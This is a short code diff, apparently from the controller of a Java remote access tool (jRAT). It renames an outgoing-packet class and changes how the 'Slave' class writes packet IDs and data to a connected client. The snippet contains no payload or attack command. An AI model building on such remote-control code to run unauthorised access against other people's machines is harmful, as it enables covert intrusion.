@@ -5,7 +5,7 @@ import jrat.common.hash.Sha1;
 import jrat.controller.exceptions.CloseException;
 import jrat.controller.net.ServerListener;
 import jrat.controller.packets.incoming.IncomingPackets;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 import jrat.controller.packets.outgoing.Packet0Ping;
 
 import java.io.DataOutputStream;
@@ -81,7 +81,7 @@ public class Slave extends AbstractSlave {
 		}
 	}
 	
-	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
+	public synchronized void addToSendQueue(OutgoingPacket packet) {
 		try {
 			sendPacket(packet, dos);
 		} catch (SocketException e) {
@@ -92,8 +92,9 @@ public class Slave extends AbstractSlave {
 		}
 	}
 
-	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
-		packet.send(this, dos);
+	public synchronized final void sendPacket(OutgoingPacket packet, DataOutputStream dos) throws Exception {
+        writeShort(packet.getPacketId());
+        packet.write(this);
 	}	
 
 	@Override
